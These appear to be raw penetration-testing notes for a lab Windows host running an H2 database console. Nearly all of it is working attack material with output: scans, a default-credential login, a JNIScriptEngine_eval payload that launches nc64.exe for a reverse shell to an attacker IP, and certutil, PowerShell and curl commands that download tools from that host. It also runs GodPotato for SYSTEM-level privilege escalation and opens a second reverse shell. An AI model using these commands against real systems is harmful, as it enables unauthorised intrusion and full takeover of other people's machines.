PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

192.168.154.66


└─$ sudo dirsearch -u http://192.168.154.66    

[10:27:20] Starting: 
[10:27:21] 403 -  312B  - /%2e%2e//google.com
[10:27:21] 301 -  150B  - /html  ->  http://192.168.154.66/html/
[10:27:22] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[10:27:29] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[10:27:48] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[10:28:01] 301 -  150B  - /help  ->  http://192.168.154.66/help/
[10:28:01] 403 -    1KB - /help/
[10:28:02] 403 -    1KB - /html/
[10:28:03] 301 -  152B  - /images  ->  http://192.168.154.66/images/
[10:28:03] 403 -    1KB - /images/
[10:28:40] 301 -  150B  - /text  ->  http://192.168.154.66/text/

└─$ sudo dirsearch -u http://192.168.154.66/html 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ed/reports/http_192.168.154.66/_html_26-08-02_10-35-47.txt

Target: http://192.168.154.66/

[10:35:47] Starting: html/
[10:35:48] 403 -  312B  - /html/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[10:35:55] 403 -  312B  - /html/\..\..\..\..\..\..\..\..\..\etc\passwd
[10:36:13] 403 -  312B  - /html/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[10:36:14] 200 -   18KB - /html/CHANGELOG.html
[10:36:14] 200 -   18KB - /html/ChangeLog.html
[10:36:14] 200 -   18KB - /html/changelog.html
[10:36:14] 200 -   51KB - /html/CHANGELOG.HTML
[10:36:14] 200 -   18KB - /html/Changelog.html
[10:36:21] 200 -    3KB - /html/download.html
[10:36:23] 200 -   13KB - /html/faq.html
[10:36:28] 301 -  157B  - /html/images  ->  http://192.168.154.66/html/images/
[10:36:30] 200 -    4KB - /html/installation.html
[10:36:33] 200 -   22KB - /html/links.html
[10:36:35] 200 -    1KB - /html/main.html
[10:36:53] 200 -    8KB - /html/search.js


default credential sa ''

https://www.exploit-db.com/exploits/49384


certutil.exe -urlcache -split -f http://192.168.45.170/nc64.exe C:\Users\Public\nc64.exe

powershell -c wget http://192.168.45.170/nc64.exe -o C:\Users\Public\nc64.exe

curl http://192.168.45.170/nc64.exe -o C:\Users\Public\nc64.exe



CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.170/Share/nc64.exe -e cmd.exe 192.168.45.170 8821").getInputStream()).useDelimiter("\\Z").next()');

└─$ impacket-smbserver share . -smb2support
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

└─$ nc -nvlp 8821          
listening on [any] 8821 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.154.66] 50176
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\tony\Desktop>C:\Windows\System32\whoami.exe /priv
C:\Windows\System32\whoami.exe /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


SeImpersonatePrivilege

since PATH is not set,

set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SystemRoot%\System32\WindowsPowerShell\v1.0\

└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.154.66 - - [02/Aug/2026 11:51:22] "GET /GodPotato-NET4.exe HTTP/1.1" 200 -
192.168.154.66 - - [02/Aug/2026 11:53:57] "GET /nc64.exe HTTP/1.1" 200 -

PS C:\Users\tony\Desktop> .\g.exe
.\g.exe
                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    


Arguments:

	-cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami" 
GodPotato -cmd "cmd /c whoami" 

PS C:\Users\tony\Desktop> .\g.exe -cmd "cmd /c whoami"
.\g.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140731985952768
[*] DispatchTable: 0x140731988295264
[*] UseProtseqFunction: 0x140731987662864
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\54aa9cb5-c6f9-4757-bcdf-965810286cef\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-05dc-ffff-4a0a-4a0043236e29
[*] DCOM obj OXID: 0x2481d70f5a98e160
[*] DCOM obj OID: 0xed82ea30df0a3364
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 788 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3420

.\g.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.170 8821"

└─$ nc -nvlp 8821
listening on [any] 8821 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.154.66] 50285
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
